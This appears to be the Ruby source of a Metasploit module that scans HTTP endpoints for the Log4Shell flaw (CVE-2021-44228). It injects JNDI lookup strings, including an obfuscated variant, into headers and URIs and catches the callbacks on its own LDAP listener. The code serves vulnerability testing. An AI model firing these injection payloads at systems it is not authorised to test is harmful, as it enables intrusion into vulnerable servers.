##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'Log4Shell HTTP Scanner',
      'Description' => %q{
        Check and HTTP endpoint for the Log4Shell vulnerability. This will try a series of HTTP requests based on the
        module configuration in an attempt to trigger a LDAP connections from a vulnerable instance.
      },
      'Author' => [
        'Spencer McIntyre'
      ],
      'References' => [
        [ 'CVE', '2021-44228' ],
      ],
      'DisclosureDate' => '2021-12-09',
      'License' => MSF_LICENSE,
      'DefaultOptions' => {
        'SRVPORT' => 389
      },
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [IOC_IN_LOGS],
        'AKA' => ['Log4Shell', 'LogJam'],
        'Reliability' => []
      }
    )

    register_options([
      OptString.new('HTTP_METHOD', [ true, 'The HTTP method to use', 'GET' ]),
      OptString.new('TARGETURI', [ true, 'The URI to scan', '/']),
      OptBool.new('LDAP_AUTH_BYPASS', [true, 'Ignore LDAP client authentication', true]),
      OptPath.new('HEADERS_FILE', [
        true, 'File containing headers to check',
        File.join(Msf::Config.data_directory, 'exploits', 'CVE-2021-44228', 'http_headers.txt')
      ]),
      OptPath.new('URIS_FILE', [ false, 'File containing additional URIs to check' ])
    ])
  end

  def jndi_string(resource)
    "${jndi:ldap://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{resource}/${sys:java.vendor}_${sys:java.version}}"
  end

  #
  # Handle incoming requests via service mixin
  #
  def on_dispatch_request(client, data)
    return if data.strip.empty?
    data.extend(Net::BER::Extensions::String)
    while pdu = data.read_ber!(self.service.syntax)
      begin
        tag = pdu[1].ber_identifier
        resp = case tag
        when 0x60 # bind request
          client.authenticated = true
          self.service.encode_ldap_response(1, pdu[0].to_i, 0, pdu[1][1], "Authenticated")
        when 0x63 # search request
          if client.authenticated or datastore['LDAP_AUTH_BYPASS']
            # Perform query against some loaded LDIF structure
            treebase = pdu[1][0]
            token, java_version = treebase.split('/', 2)
            unless (context = @tokens.delete(token)).nil?
              details = normalize_uri(context[:target_uri]).to_s
              details << " (header: #{context[:headers].keys.first})" unless context[:headers].nil?
              details << " (java: #{java_version})" unless java_version.blank?
              print_good('Log4Shell found via ' + details)
              report_vuln(
                host: context[:rhost],
                port: context[:rport],
                info: "Module #{fullname} detected Log4Shell vulnerability via #{details}",
                name: name,
                refs: references
              )
            end
          else
            encode_ldap_response(5, pdu[0].to_i, 50, "", "Not authenticated")
          end
          client.close
        else
          vprint_status("Client sent unexpected request #{tag}")
          client.close
        end
      end
    end
    resp
  end

  def rand_text_alpha_lower_numeric(len, bad = '')
    foo = []
    foo += ('a'..'z').to_a
    foo += ('0'..'9').to_a
    Rex::Text.rand_base(len, bad, *foo)
  end

  def run
    @tokens = {}
    start_service
    super
  ensure
    stop_service
  end

  def replicant
    obj = super
    obj.tokens = tokens
    obj
  end

  # Fingerprint a single host
  def run_host(ip)
    run_host_uri(ip, normalize_uri(target_uri)) unless target_uri.blank?

    return if datastore['URIS_FILE'].blank?

    File.open(datastore['URIS_FILE'], 'rb').lines.each do |uri|
      uri.strip!
      next if uri.start_with?('#')

      run_host_uri(ip, normalize_uri(target_uri, uri))
    end
  end

  def run_host_uri(_ip, uri)
    headers_file = File.open(datastore['HEADERS_FILE'], 'rb')
    headers_file.lines.each do |header|
      header.strip!
      next if header.start_with?('#')

      token = rand_text_alpha_lower_numeric(8..32)
      test(token, uri: uri, headers: { header => jndi_string(token) })
    end

    token = rand_text_alpha_lower_numeric(8..32)
    jndi = jndi_string(token)
    test(token, uri: normalize_uri(uri, Rex::Text.uri_encode(jndi.gsub('ldap://', 'ldap:${::-/}/')), '/'))

    token = rand_text_alpha_lower_numeric(8..32)
    jndi = jndi_string(token)
    test(token, uri: normalize_uri(uri, Rex::Text.uri_encode(jndi.gsub('ldap://', 'ldap:${::-/}/'))))
  end

  def test(token, uri: nil, headers: nil)
    @tokens[token] = {
      rhost: rhost,
      rport: rport,
      target_uri: uri,
      headers: headers
    }

    send_request_raw(
      'uri' => uri,
      'method' => datastore['HTTP_METHOD'],
      'headers' => headers
    )
  end

  attr_accessor :tokens
end
